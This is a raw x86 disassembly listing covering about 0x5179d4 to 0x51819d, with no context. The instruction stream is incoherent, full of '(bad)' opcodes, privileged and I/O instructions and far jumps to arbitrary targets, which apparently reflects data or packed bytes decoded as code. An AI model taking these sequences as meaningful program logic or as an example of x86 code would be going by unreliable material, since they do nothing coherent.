  5179d4:	sti    
  5179d5:	xchg   BYTE PTR [ecx],dl
  5179d7:	push   ecx
  5179d8:	mov    bl,BYTE PTR [ebp+0x57]
  5179db:	mov    edi,0xb52c6331
  5179e0:	pop    es
  5179e1:	jp     0x517963
  5179e3:	ja     0x517a00
  5179e5:	bound  ecx,QWORD PTR [ebp+0x4d]
  5179e8:	inc    ecx
  5179e9:	mov    ch,0x7f
  5179eb:	ror    DWORD PTR [edx+edi*2-0x62c59908],0x90
  5179f3:	inc    ebp
  5179f4:	aam    0x5
  5179f6:	fs addr16 or ebp,0xffffff98
  5179fb:	sbb    BYTE PTR [esi],ah
  5179fd:	fwait
  5179fe:	pop    edi
  5179ff:	fbld   TBYTE PTR [ecx-0x58c76166]
  517a05:	pop    ds
  517a06:	cdq    
  517a07:	mov    ecx,0xf3720342
  517a0c:	push   esp
  517a0d:	inc    edi
  517a0e:	and    eax,DWORD PTR [ebx+eax*1]
  517a11:	jg     0x517a47
  517a13:	loope  0x517998
  517a15:	jno    0x517a38
  517a17:	inc    eax
  517a18:	fmulp  st(6),st
  517a1a:	stos   BYTE PTR es:[edi],al
  517a1b:	xor    edx,DWORD PTR [ebx-0x4f]
  517a1e:	shl    BYTE PTR [esi],1
  517a20:	shl    BYTE PTR [ebx+esi*4],0xa8
  517a24:	jo     0x5179d4
  517a26:	in     eax,0x58
  517a28:	or     DWORD PTR [eax+0x7f],esp
  517a2b:	pop    ds
  517a2c:	sub    al,0x7f
  517a2e:	in     eax,dx
  517a2f:	dec    ecx
  517a30:	mov    cl,0x43
  517a32:	dec    ebx
  517a33:	mov    esi,0x5c548e1
  517a38:	xor    al,0x95
  517a3a:	retf   
  517a3b:	ins    BYTE PTR es:[edi],dx
  517a3c:	or     BYTE PTR [edi+0x32d752be],bh
  517a42:	dec    ebx
  517a43:	cmc    
  517a44:	repnz and DWORD PTR [esi-0x2f],esi
  517a48:	test   eax,0x815ddf93
  517a4d:	mov    bl,BYTE PTR [ebx+0x6762d8a6]
  517a53:	fld    TBYTE PTR [eax-0x53d5ba88]
  517a59:	repnz arpl WORD PTR [ecx-0x6f112a9e],bx
  517a60:	not    BYTE PTR [eax+ebp*4-0x4106701a]
  517a67:	dec    eax
  517a68:	sub    eax,0xad37691d
  517a6d:	and    eax,0xa2b4b20b
  517a72:	mov    ds:0xd5625bc3,al
  517a77:	dec    DWORD PTR [edx-0x36b199e8]
  517a7d:	push   edi
  517a7e:	mov    ch,0xf4
  517a80:	push   ss
  517a81:	cs loope 0x517a2a
  517a84:	repnz adc BYTE PTR [edx+0x3b46a41a],ch
  517a8b:	jbe    0x517a7e
  517a8d:	inc    ebp
  517a8e:	and    BYTE PTR [ebp+esi*1-0x59],cl
  517a92:	fs neg ebp
  517a95:	shl    dh,cl
  517a97:	sbb    esi,DWORD PTR [edi+0x6a59c3ab]
  517a9d:	lds    edx,FWORD PTR [ebx]
  517a9f:	imul   ebp,DWORD PTR [edx+0x75],0xffffffcf
  517aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  517aa4:	xchg   esi,eax
  517aa5:	pop    edi
  517aa6:	in     al,dx
  517aa7:	xchg   esp,eax
  517aa8:	les    eax,FWORD PTR ds:[ecx]
  517aab:	fsubr  DWORD PTR [ecx+0x4d7b8b29]
  517ab1:	faddp  st(7),st
  517ab3:	aam    0x16
  517ab5:	je     0x517b13
  517ab7:	xchg   DWORD PTR [ecx-0x6dfd8c08],esp
  517abd:	add    eax,ebx
  517abf:	sbb    al,0x33
  517ac1:	fild   WORD PTR [edx-0x2]
  517ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517ac5:	mov    al,ds:0x7637b6cf
  517aca:	pushf  
  517acb:	adc    DWORD PTR [edx],esp
  517acd:	push   cs
  517ace:	and    ecx,DWORD PTR [esi]
  517ad0:	and    eax,0x8f8e604
  517ad5:	xor    ah,BYTE PTR [esi+ecx*2+0x2f7efcda]
  517adc:	mov    bh,0x2d
  517ade:	ds (bad) 
  517ae0:	xchg   ebp,eax
  517ae1:	(bad)  
  517ae2:	data16 test BYTE PTR [eax-0x3d84c568],bl
  517ae9:	out    0x6a,eax
  517aeb:	icebp  
  517aec:	jnp    0x517ab6
  517aee:	inc    ebp
  517aef:	sti    
  517af0:	and    al,0xd1
  517af2:	dec    esi
  517af3:	scas   eax,DWORD PTR es:[edi]
  517af4:	adc    al,0xd4
  517af6:	pop    ss
  517af7:	xor    al,cl
  517af9:	cwde   
  517afa:	bound  ecx,QWORD PTR [edi]
  517afc:	mov    esi,0x89665223
  517b01:	jne    0x517ad9
  517b03:	mov    esp,0xb20568bc
  517b08:	xchg   esi,eax
  517b09:	sub    eax,0xf02e0b0c
  517b0e:	fwait
  517b0f:	or     DWORD PTR [edi+ebp*4+0x69],0x422eb34c
  517b17:	ins    DWORD PTR es:[edi],dx
  517b18:	jno    0x517aef
  517b1a:	pusha  
  517b1b:	jl     0x517b82
  517b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  517b1e:	movlps QWORD PTR [ecx-0x77],xmm5
  517b22:	cdq    
  517b23:	aad    0x79
  517b25:	in     al,dx
  517b26:	aam    0x72
  517b28:	imul   edi,DWORD PTR [esi],0xffffffee
  517b2b:	rcr    esp,1
  517b2d:	loopne 0x517b15
  517b2f:	xchg   edi,eax
  517b30:	sub    DWORD PTR [esi-0x1d],ecx
  517b33:	dec    eax
  517b34:	rcr    DWORD PTR [edx],0x84
  517b37:	les    edi,FWORD PTR [edi-0x76d0c827]
  517b3d:	xchg   ecx,eax
  517b3e:	je     0x517b0f
  517b40:	ja     0x517b20
  517b42:	xchg   ebp,eax
  517b43:	mov    esi,0x246b42cb
  517b48:	sub    eax,0xe3c4b6aa
  517b4d:	fsub   DWORD PTR [ecx-0xb]
  517b50:	pushw  0x70
  517b53:	or     DWORD PTR [ebp-0x1d],esi
  517b56:	int    0xd8
  517b58:	mov    ch,0x66
  517b5a:	jp     0x517bd2
  517b5c:	ret    0x9760
  517b5f:	fisub  WORD PTR ds:0x95f3352e
  517b65:	sbb    eax,0x5697a16
  517b6a:	test   BYTE PTR [ebx],bh
  517b6c:	in     eax,dx
  517b6d:	or     DWORD PTR [esi],0x39e41db6
  517b73:	loop   0x517bdf
  517b75:	xchg   ebp,eax
  517b76:	punpckldq mm4,DWORD PTR [edx+0x28]
  517b7a:	and    ah,bl
  517b7c:	mov    al,ds:0x985e9c48
  517b81:	push   edx
  517b82:	scas   eax,DWORD PTR es:[edi]
  517b83:	lods   al,BYTE PTR ds:[esi]
  517b84:	pop    esp
  517b85:	dec    ebx
  517b86:	std    
  517b87:	into   
  517b88:	inc    edx
  517b89:	retf   0x4b3e
  517b8c:	outs   dx,DWORD PTR ds:[esi]
  517b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517b8e:	inc    ecx
  517b8f:	js     0x517bdd
  517b91:	fdivr  DWORD PTR [eax+0x14d4e6d1]
  517b97:	out    dx,al
  517b98:	imul   ebx,DWORD PTR [ecx],0x30
  517b9b:	sub    al,0x52
  517b9d:	cs adc di,cx
  517ba1:	sub    BYTE PTR [edx-0x655fcbb8],al
  517ba7:	pushf  
  517ba8:	out    0xa3,al
  517baa:	mov    ch,BYTE PTR [ebp+0x1e]
  517bad:	mov    ebp,0xa74c19d0
  517bb2:	add    ebp,DWORD PTR [ebp*8+0x1893a7d9]
  517bb9:	ss inc ecx
  517bbc:	push   0x5cff4321
  517bc1:	jns    0x517c2e
  517bc3:	ja     0x517bbe
  517bc5:	sbb    DWORD PTR [eax-0x36],ecx
  517bc8:	enter  0x314b,0x9b
  517bcc:	sbb    al,0xfc
  517bce:	cwde   
  517bcf:	adc    al,0x7
  517bd1:	aas    
  517bd2:	jnp    0x517bbb
  517bd4:	sti    
  517bd5:	fiadd  WORD PTR [edi+0x5e9378d0]
  517bdb:	mov    ?,WORD PTR [ecx]
  517bdd:	mov    al,0xd8
  517bdf:	lock sub DWORD PTR [eax-0x4ffb71e6],ebp
  517be6:	adc    esi,DWORD PTR [esi+0x2416b0b9]
  517bec:	mov    ah,0x8b
  517bee:	adc    BYTE PTR [esi],ah
  517bf0:	push   esi
  517bf1:	pop    ebp
  517bf2:	and    BYTE PTR [edi],bl
  517bf4:	pop    ebp
  517bf5:	push   0x3c870d65
  517bfa:	xchg   ebx,eax
  517bfb:	scas   eax,DWORD PTR es:[edi]
  517bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  517bfe:	sar    DWORD PTR [ecx],cl
  517c00:	add    BYTE PTR [eax+0x33a25d8e],al
  517c06:	(bad)  
  517c07:	sbb    eax,0xd5cb9842
  517c0c:	mov    esp,0x996bc912
  517c11:	or     DWORD PTR [ecx+0x3c4c9a2d],esp
  517c17:	and    ebp,0xa313788e
  517c1d:	cdq    
  517c1e:	mov    ebx,0xa06ca55c
  517c23:	mov    al,0x3b
  517c25:	cmp    BYTE PTR [ebp+ebx*1+0x49491ac9],cl
  517c2c:	aad    0x88
  517c2e:	hlt    
  517c2f:	cwde   
  517c30:	paddb  mm0,QWORD PTR [edi+0x60792085]
  517c37:	into   
  517c38:	aaa    
  517c39:	loop   0x517c64
  517c3b:	jl     0x517c67
  517c3d:	xchg   esp,eax
  517c3e:	mov    ds:0x7157f1b6,al
  517c43:	cmp    bh,BYTE PTR [edx+0x4f]
  517c46:	(bad)  
  517c47:	sub    ebx,DWORD PTR [eax+ebx*8]
  517c4a:	mov    eax,0x6e1605d0
  517c4f:	in     al,0x3f
  517c51:	pusha  
  517c52:	into   
  517c53:	dec    ebp
  517c54:	or     cl,bh
  517c56:	pop    ss
  517c57:	adc    DWORD PTR [ebx-0x5dae2e4],ebp
  517c5d:	mov    es,WORD PTR [edi+0x58]
  517c60:	scas   al,BYTE PTR es:[edi]
  517c61:	dec    esp
  517c62:	ror    BYTE PTR [ecx-0x4d8598c0],1
  517c68:	sbb    eax,0xdcdad659
  517c6d:	fwait
  517c6e:	inc    ecx
  517c6f:	cmc    
  517c70:	daa    
  517c71:	addr16 mov dh,0xfa
  517c74:	xchg   ebp,eax
  517c75:	out    0x48,al
  517c77:	ins    BYTE PTR es:[edi],dx
  517c78:	cmc    
  517c79:	add    BYTE PTR [edx],bl
  517c7b:	ja     0x517c4b
  517c7d:	adc    ebp,DWORD PTR [ecx]
  517c7f:	dec    esp
  517c80:	sbb    eax,0xe59c951d
  517c85:	push   ds
  517c86:	cwde   
  517c87:	repz dec ebx
  517c89:	fdiv   DWORD PTR [ecx-0x78110d21]
  517c8f:	addr16 jp 0x517c8c
  517c92:	add    esi,DWORD PTR [eax+0x23eae671]
  517c98:	xchg   esp,eax
  517c99:	inc    ebp
  517c9a:	cwde   
  517c9b:	pop    esi
  517c9c:	stos   DWORD PTR es:[edi],eax
  517c9d:	ins    BYTE PTR es:[edi],dx
  517c9e:	xor    al,0xeb
  517ca0:	(bad)  
  517ca1:	mov    al,0x4c
  517ca3:	into   
  517ca4:	es dec ebx
  517ca6:	cmp    eax,0xdd28df34
  517cab:	cmp    al,0xef
  517cad:	inc    edx
  517cae:	xor    eax,0x50f5e98c
  517cb3:	icebp  
  517cb4:	jae    0x517c86
  517cb6:	test   BYTE PTR [edi+0x11187160],ah
  517cbc:	push   0x14ab149d
  517cc1:	es stc 
  517cc3:	pushf  
  517cc4:	xlat   BYTE PTR ds:[ebx]
  517cc5:	ja     0x517cfd
  517cc7:	inc    DWORD PTR [edx]
  517cc9:	xor    BYTE PTR [esi+eax*4+0x7961d5b6],al
  517cd0:	sbb    bl,bh
  517cd2:	scas   eax,DWORD PTR es:[edi]
  517cd3:	dec    ecx
  517cd4:	mov    cl,0x18
  517cd6:	push   0x9303ad26
  517cdb:	ins    DWORD PTR es:[edi],dx
  517cdc:	mov    cl,0xf4
  517cde:	xor    esi,esi
  517ce0:	rcr    ebx,0x86
  517ce3:	xchg   ebp,eax
  517ce4:	ins    DWORD PTR es:[edi],dx
  517ce5:	jecxz  0x517cf8
  517ce7:	jl     0x517d68
  517ce9:	rcl    BYTE PTR [ebx],0xe3
  517cec:	jg     0x517cfb
  517cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  517cef:	inc    esp
  517cf0:	pushf  
  517cf1:	adc    ah,bh
  517cf3:	iret   
  517cf4:	add    al,0x35
  517cf6:	adc    BYTE PTR [ebx-0x77ff366a],al
  517cfc:	out    0x2a,eax
  517cfe:	popf   
  517cff:	lahf   
  517d00:	sbb    eax,0x6b32fd3c
  517d05:	cs add al,0xa6
  517d08:	mov    cs,WORD PTR [edi+edi*4-0x625c6ec2]
  517d0f:	xchg   ebx,eax
  517d10:	fsub   QWORD PTR [edx-0x7e]
  517d13:	in     al,dx
  517d14:	cs sbb esi,ecx
  517d17:	sti    
  517d18:	call   0xd54:0x55de6dd0
  517d1f:	(bad)  
  517d20:	aad    0x85
  517d22:	loope  0x517d88
  517d24:	add    ebp,ecx
  517d26:	xor    dl,BYTE PTR [ecx+0x6e6e8409]
  517d2c:	jne    0x517da6
  517d2e:	mov    esi,0xfbc6a85b
  517d33:	int    0xf4
  517d35:	inc    ebp
  517d36:	std    
  517d37:	inc    esi
  517d38:	loope  0x517d23
  517d3a:	cmp    BYTE PTR [ebx+0x7a637b74],ch
  517d40:	into   
  517d41:	jne    0x517d3b
  517d43:	ja     0x517d48
  517d45:	and    esi,DWORD PTR [esi+0x2bf804a3]
  517d4b:	or     ecx,edi
  517d4d:	test   eax,0x4b27f809
  517d52:	push   0x3304cf65
  517d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517d58:	xor    ah,ch
  517d5a:	ror    DWORD PTR [edi+0x5f20ef53],1
  517d60:	das    
  517d61:	dec    ebp
  517d62:	sar    DWORD PTR [ecx+0x1d],cl
  517d65:	stos   DWORD PTR es:[edi],eax
  517d66:	mov    dh,ah
  517d68:	mov    ?,WORD PTR [ebx]
  517d6a:	jne    0x517d0c
  517d6c:	push   esp
  517d6d:	mov    BYTE PTR [ecx+0x7d],ah
  517d70:	js     0x517d6b
  517d72:	loope  0x517d22
  517d74:	int    0xdb
  517d76:	sub    DWORD PTR [esi+0x25],ebx
  517d79:	scas   al,BYTE PTR es:[edi]
  517d7a:	jno    0x517dfb
  517d7c:	mov    WORD PTR [edx-0x1e],?
  517d7f:	pop    edx
  517d80:	mov    ah,BYTE PTR [ebx-0x65]
  517d83:	jl     0x517d9a
  517d85:	mov    ch,0x24
  517d87:	xor    al,0xb8
  517d89:	and    eax,0x9ffb7780
  517d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  517d8f:	sub    dh,dh
  517d91:	lock xor eax,0x490f1e6a
  517d97:	icebp  
  517d98:	dec    edx
  517d99:	push   0x63ae5785
  517d9e:	aad    0xcf
  517da0:	jg     0x517d81
  517da2:	xchg   edx,eax
  517da3:	sbb    BYTE PTR [edx-0x77],ch
  517da6:	loopne 0x517dce
  517da8:	or     cl,BYTE PTR [esi+0x4e]
  517dab:	push   ds
  517dac:	push   esp
  517dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517dae:	test   al,0x38
  517db0:	fild   QWORD PTR [edi]
  517db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517db3:	mov    bh,0x60
  517db5:	les    esi,FWORD PTR [eax-0x71]
  517db8:	pop    esp
  517db9:	add    DWORD PTR [eax-0x36aa66b8],edi
  517dbf:	idiv   DWORD PTR ds:0x5a67e4a
  517dc5:	or     edi,DWORD PTR [ebp-0x6a27dc86]
  517dcb:	xor    BYTE PTR [edi-0xe],0xcb
  517dcf:	repnz fs pop ss
  517dd2:	jbe    0x517e2b
  517dd4:	jmp    0x4df5c565
  517dd9:	mov    dl,BYTE PTR [ebx-0x6f]
  517ddc:	inc    esi
  517ddd:	sti    
  517dde:	mov    dl,0x87
  517de0:	jle    0x517dd4
  517de2:	xor    eax,0x44647c2b
  517de7:	adc    esp,eax
  517de9:	mov    eax,ds:0x855ee89f
  517dee:	cmp    eax,ebp
  517df0:	icebp  
  517df1:	mov    esp,0xc06a48ac
  517df6:	stc    
  517df7:	pop    ecx
  517df8:	xchg   ebx,eax
  517df9:	push   ecx
  517dfa:	mov    dl,0xa8
  517dfc:	(bad)  
  517dfd:	lds    eax,FWORD PTR [ebp-0x6701bbc8]
  517e03:	shl    esp,cl
  517e05:	mov    ds:0x53ad97d9,al
  517e0a:	adc    bl,BYTE PTR [ebp-0x262773ed]
  517e10:	pop    ss
  517e11:	mov    al,ds:0x74e9f1d0
  517e16:	dec    esp
  517e17:	mov    eax,ds:0x4f485da8
  517e1c:	xchg   ebp,eax
  517e1d:	mov    ebx,edx
  517e1f:	sbb    BYTE PTR [ecx-0x33],ch
  517e22:	sub    ecx,eax
  517e24:	or     BYTE PTR [edx+0x78],bl
  517e27:	dec    eax
  517e28:	rcl    al,1
  517e2a:	and    al,0xbe
  517e2c:	and    al,0xe2
  517e2e:	loope  0x517e3f
  517e30:	jae    0x517dd3
  517e32:	pop    esi
  517e33:	mov    dh,0xaa
  517e35:	cvtps2pi mm7,QWORD PTR [edi+0x36]
  517e39:	jmp    DWORD PTR [ecx+0x4f]
  517e3c:	mov    al,0x79
  517e3e:	mov    ds:0xb1b7b307,eax
  517e43:	xchg   esp,eax
  517e44:	stos   BYTE PTR es:[edi],al
  517e45:	inc    edi
  517e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517e47:	sub    bh,bl
  517e49:	fldenv [eax+0x5ed8d90a]
  517e4f:	pop    DWORD PTR [ebx+0x7aa4c349]
  517e55:	imul   ebp,DWORD PTR [ecx-0x6c07b065],0x59
  517e5c:	mov    BYTE PTR [edi+0x1a],bl
  517e5f:	(bad)  
  517e60:	pop    ebp
  517e61:	jnp    0x517e01
  517e63:	push   0xc9cb822b
  517e68:	jnp    0x517eaa
  517e6a:	int    0xa1
  517e6c:	pop    ecx
  517e6d:	fld    DWORD PTR [edx]
  517e6f:	jb     0x517e8d
  517e71:	or     bh,bl
  517e73:	xchg   esi,eax
  517e74:	les    ebp,FWORD PTR [ecx+eiz*8+0x2]
  517e78:	add    dl,BYTE PTR [ebx]
  517e7a:	sub    edi,DWORD PTR [esi]
  517e7c:	mov    al,0x8c
  517e7e:	pop    ss
  517e7f:	sbb    dl,BYTE PTR [esi]
  517e81:	push   es
  517e82:	mov    dl,0x87
  517e84:	mov    eax,ds:0x127d6640
  517e8a:	sbb    BYTE PTR [eax+0x13],0xda
  517e8e:	inc    eax
  517e8f:	lds    ecx,FWORD PTR [ecx+0x596707ed]
  517e95:	and    DWORD PTR [ecx],esi
  517e97:	mov    dh,0x9
  517e99:	lock (bad) [eax]
  517e9c:	div    esi
  517e9e:	not    esp
  517ea0:	sub    BYTE PTR [edi+0x13b96e6a],dh
  517ea6:	pop    edi
  517ea7:	jmp    0x9d770495
  517eac:	or     BYTE PTR [esi],ch
  517eae:	repnz push edi
  517eb0:	jmp    0xd351:0xb616de16
  517eb7:	sub    DWORD PTR [ecx+0x0],ebp
  517eba:	adc    BYTE PTR [ebx+0x4e],dl
  517ebd:	jp     0x517ee1
  517ebf:	fwait
  517ec0:	aas    
  517ec1:	push   edi
  517ec2:	jb     0x517e88
  517ec4:	ja     0x517f34
  517ec6:	(bad)  
  517ec7:	xor    BYTE PTR [eax],bl
  517ec9:	fdivr  DWORD PTR [ecx+0x42eaff9]
  517ecf:	xchg   edx,eax
  517ed0:	pop    edx
  517ed1:	xchg   DWORD PTR [edx-0x69],edi
  517ed4:	sub    eax,0x6b465d8d
  517ed9:	push   edx
  517eda:	or     eax,0xe5e70562
  517edf:	jg     0x517f57
  517ee1:	mov    ah,0x44
  517ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  517ee4:	inc    edi
  517ee5:	xchg   esi,eax
  517ee6:	pop    ecx
  517ee7:	jmp    0x2970:0x3c251ce0
  517eee:	push   0x460a86c2
  517ef3:	je     0x517eaa
  517ef5:	fild   WORD PTR [esi-0x3a652b68]
  517efb:	inc    BYTE PTR [edx+ebp*8]
  517efe:	inc    ebp
  517eff:	fisubr WORD PTR [eax+ecx*4-0x2266f742]
  517f06:	cmp    eax,DWORD PTR [edx+eax*4-0xf]
  517f0a:	test   DWORD PTR [edx],ebp
  517f0c:	(bad)  
  517f0d:	mov    ebx,0x2410285
  517f12:	popa   
  517f13:	enter  0xf785,0xaa
  517f17:	(bad)  
  517f18:	ror    BYTE PTR [ecx],cl
  517f1a:	aaa    
  517f1b:	out    dx,eax
  517f1c:	and    ebx,esp
  517f1e:	mov    BYTE PTR [esi],al
  517f20:	sbb    al,0xd
  517f22:	out    0x9,eax
  517f24:	stos   BYTE PTR es:[edi],al
  517f25:	sbb    eax,0x26f1e949
  517f2a:	mov    edx,DWORD PTR [ecx]
  517f2c:	push   esi
  517f2d:	adc    BYTE PTR [ebx],bh
  517f2f:	jno    0x517f62
  517f31:	mov    WORD PTR [ecx-0x4390a2ea],cs
  517f37:	dec    ebp
  517f38:	add    al,0xf0
  517f3a:	inc    edi
  517f3b:	arpl   WORD PTR [ebx+esi*8+0x37aa38a8],si
  517f42:	mov    cl,0x7c
  517f44:	push   eax
  517f45:	les    edi,FWORD PTR [ebx+eiz*2]
  517f48:	popf   
  517f49:	lea    ebx,[eax-0x54]
  517f4c:	imul   eax,DWORD PTR [ebp-0x31],0xffffffc7
  517f50:	cdq    
  517f51:	inc    esp
  517f52:	stos   BYTE PTR es:[edi],al
  517f53:	enter  0xa422,0x4b
  517f57:	adc    cl,BYTE PTR [ecx]
  517f59:	sub    eax,0x127300d
  517f5e:	pusha  
  517f5f:	or     esp,DWORD PTR [edx-0x290aaa2a]
  517f65:	pop    ss
  517f66:	test   BYTE PTR [edi-0x1],dh
  517f69:	arpl   WORD PTR [ecx],sp
  517f6b:	ins    DWORD PTR es:[edi],dx
  517f6c:	xor    ebp,DWORD PTR [esi-0x64eb29f0]
  517f72:	das    
  517f73:	jmp    0x87dc17d2
  517f78:	(bad)  
  517f79:	sbb    BYTE PTR [ebx+ecx*2+0x2fd1e663],bl
  517f80:	dec    ecx
  517f81:	lahf   
  517f82:	in     al,dx
  517f83:	shr    BYTE PTR [ebp+0x3f],1
  517f86:	xchg   ebx,eax
  517f87:	not    WORD PTR [ecx]
  517f8a:	sub    esp,DWORD PTR [ebx-0x668c1414]
  517f90:	mov    esi,0xc43247be
  517f95:	lds    eax,FWORD PTR gs:[edx+0x338a311d]
  517f9c:	sbb    BYTE PTR ds:0xdbf6f843,dl
  517fa2:	sbb    DWORD PTR [ebx],ebp
  517fa4:	mov    ds:0xe7fe3244,al
  517fa9:	adc    edx,DWORD PTR [edi+0x1d]
  517fac:	ds test al,0x3e
  517faf:	sub    eax,0x6affe7ac
  517fb4:	jge    0x517fa8
  517fb6:	pop    esp
  517fb7:	xchg   ebp,eax
  517fb8:	fstp   DWORD PTR [ebx+0x5e]
  517fbb:	or     DWORD PTR [ebp+eax*4+0x67],edi
  517fbf:	fstp   TBYTE PTR [ebx+ebx*2-0x1]
  517fc3:	popa   
  517fc4:	mov    edi,0xa2e539dd
  517fc9:	sbb    al,0x69
  517fcb:	xor    DWORD PTR ds:0x94184c3b,ebp
  517fd1:	push   0xf566a492
  517fd6:	cwde   
  517fd7:	jecxz  0x51804e
  517fd9:	dec    edi
  517fda:	rcl    BYTE PTR [esi-0x60],1
  517fdd:	into   
  517fde:	out    dx,al
  517fdf:	int    0x1d
  517fe1:	jle    0x518047
  517fe3:	stos   DWORD PTR es:[edi],eax
  517fe4:	lock jbe 0x518017
  517fe7:	xor    al,0x24
  517fe9:	sbb    ah,BYTE PTR [ecx]
  517feb:	imul   esi,ebp,0xa699b89f
  517ff1:	or     al,BYTE PTR [ecx-0x648fafbc]
  517ff7:	cmp    al,0x10
  517ff9:	or     eax,0xf10106ea
  517ffe:	ins    BYTE PTR es:[edi],dx
  517fff:	push   0xeca07b93
  518004:	arpl   bx,ax
  518006:	jbe    0x517ff8
  518008:	call   0x4c6829d
  51800d:	imul   edi,DWORD PTR [esi-0x36c8c0dc],0x6e
  518014:	add    eax,0xb2a90bd7
  518019:	inc    esp
  51801a:	inc    ebp
  51801b:	mov    ecx,0xab749c05
  518020:	or     al,BYTE PTR [esi]
  518022:	std    
  518023:	or     edx,DWORD PTR [edx]
  518025:	push   edx
  518026:	xchg   esi,eax
  518027:	xchg   ecx,eax
  518028:	(bad)  
  518029:	leave  
  51802a:	nop
  51802b:	lds    edx,FWORD PTR [edi+0x510aa770]
  518031:	add    DWORD PTR [edx+0x4b],0x85e6239f
  518038:	jmp    0x518013
  51803a:	or     BYTE PTR [ecx+0x70],dl
  51803d:	pop    es
  51803e:	jp     0x518040
  518040:	out    0xda,eax
  518042:	cmp    eax,0xd5487589
  518047:	mov    ds:0x36c5de3c,eax
  51804c:	dec    eax
  51804d:	dec    esp
  51804e:	xchg   ecx,eax
  51804f:	mov    esp,0xa6c8372
  518054:	loop   0x518045
  518056:	and    bl,al
  518058:	rcr    DWORD PTR [edx-0x2e],0x22
  51805c:	push   esp
  51805d:	outs   dx,DWORD PTR ds:[esi]
  51805e:	inc    edi
  51805f:	outs   dx,BYTE PTR ds:[esi]
  518060:	adc    ch,dl
  518062:	call   0xe23a:0xc7302ef5
  518069:	and    si,WORD PTR [eax]
  51806c:	daa    
  51806d:	inc    edi
  51806e:	cmovge edx,DWORD PTR [edx-0xeb7faa1]
  518075:	in     eax,0x58
  518077:	cli    
  518078:	push   cs
  518079:	sub    al,bh
  51807b:	push   cs
  51807c:	or     BYTE PTR fs:[ebx+0x6d],dl
  518080:	fimul  DWORD PTR [eax+ebp*1+0x2cd9dd0]
  518087:	in     eax,dx
  518088:	mov    ds:0x57349fb6,al
  51808d:	add    DWORD PTR [esi],ebp
  51808f:	js     0x5180b5
  518091:	test   al,0xdc
  518093:	xchg   ebp,eax
  518094:	loop   0x51804d
  518096:	xor    DWORD PTR [edi-0x2d],ebx
  518099:	pop    esi
  51809a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51809b:	pop    esi
  51809c:	dec    esi
  51809d:	outs   dx,DWORD PTR ds:[esi]
  51809e:	bswap  edx
  5180a0:	and    DWORD PTR [ebp+0x56],0xc5b1e069
  5180a7:	push   esp
  5180a8:	popf   
  5180a9:	scas   al,BYTE PTR es:[edi]
  5180aa:	bound  edx,QWORD PTR [edi+0x1dae3a9c]
  5180b0:	in     al,0xa4
  5180b2:	or     eax,0xc2f01c5d
  5180b7:	mov    eax,0x2b5a3c42
  5180bc:	les    esi,FWORD PTR [ebx-0x29]
  5180bf:	jne    0x5180fa
  5180c1:	aad    0x3b
  5180c3:	inc    esp
  5180c4:	pop    eax
  5180c5:	jne    0x51812d
  5180c7:	push   0xf5300d47
  5180cc:	test   eax,0xeeba413a
  5180d1:	out    0x99,eax
  5180d3:	pushf  
  5180d4:	xchg   ecx,eax
  5180d5:	cmp    dl,dh
  5180d7:	cmp    ebx,DWORD PTR [edx]
  5180d9:	adc    eax,0xca4f0ecc
  5180de:	dec    ebp
  5180df:	popf   
  5180e0:	out    dx,al
  5180e1:	aam    0xf8
  5180e3:	std    
  5180e4:	add    al,0x6f
  5180e6:	adc    edx,DWORD PTR [edi-0x31e4a0f6]
  5180ec:	(bad)  
  5180ed:	enter  0x57cc,0x0
  5180f1:	sbb    esp,DWORD PTR [eax-0x78c1b22d]
  5180f7:	cmp    al,0xc
  5180f9:	les    ecx,FWORD PTR [eax-0x6f609a5b]
  5180ff:	dec    edx
  518100:	mov    edx,0x4bc2d3e9
  518105:	jmp    0x5cbafb25
  51810a:	outs   dx,BYTE PTR ds:[esi]
  51810b:	cmp    DWORD PTR [esi+0x7c07c981],0x9a5a90b2
  518115:	pop    esp
  518116:	and    bh,dl
  518118:	mov    al,ds:0x38b52c34
  51811d:	inc    ebp
  51811e:	iret   
  51811f:	mov    ecx,0xf7e3f53d
  518124:	or     BYTE PTR [eax+0x28],cl
  518127:	mov    bh,0xa8
  518129:	hlt    
  51812a:	push   esi
  51812b:	daa    
  51812c:	sbb    BYTE PTR [ebx+0x5131677f],cl
  518132:	xor    eax,0x6ec684c0
  518137:	mov    dl,0x49
  518139:	cdq    
  51813a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51813b:	push   0x18
  51813d:	jae    0x518102
  51813f:	sbb    eax,DWORD PTR [eax-0x370b69ba]
  518145:	dec    ebx
  518146:	call   0xf56d6c81
  51814b:	jb     0x51810f
  51814d:	imul   esi,ecx,0x5e542fce
  518153:	shr    ecx,cl
  518155:	aas    
  518156:	aam    0xd6
  518158:	pop    ss
  518159:	mov    ah,BYTE PTR ds:0x42d01bef
  51815f:	std    
  518160:	adc    cl,dl
  518162:	mov    ecx,0x69859f52
  518167:	outs   dx,BYTE PTR ds:[esi]
  518168:	(bad)  
  518169:	cld    
  51816a:	rcl    DWORD PTR [ebp-0x422a8807],1
  518170:	dec    esp
  518171:	add    ebx,DWORD PTR [edx-0x1e]
  518174:	mov    eax,ds:0x9da37198
  518179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51817a:	(bad)  
  51817b:	call   0xfc1c:0x3d331713
  518182:	xor    al,0x1b
  518184:	rol    BYTE PTR [ebx],0x4a
  518187:	aaa    
  518188:	cdq    
  518189:	xchg   ecx,eax
  51818a:	jmp    0x518151
  51818c:	jle    0x518139
  51818e:	mov    bh,0xe0
  518190:	imul   ebx,ebp,0x4890cf77
  518196:	jecxz  0x518201
  518198:	popa   
  518199:	push   edx
  51819a:	dec    edx
  51819b:	std    
  51819c:	dec    esi
  51819d:	sub    ah,BYTE PTR [edx+edi*8]
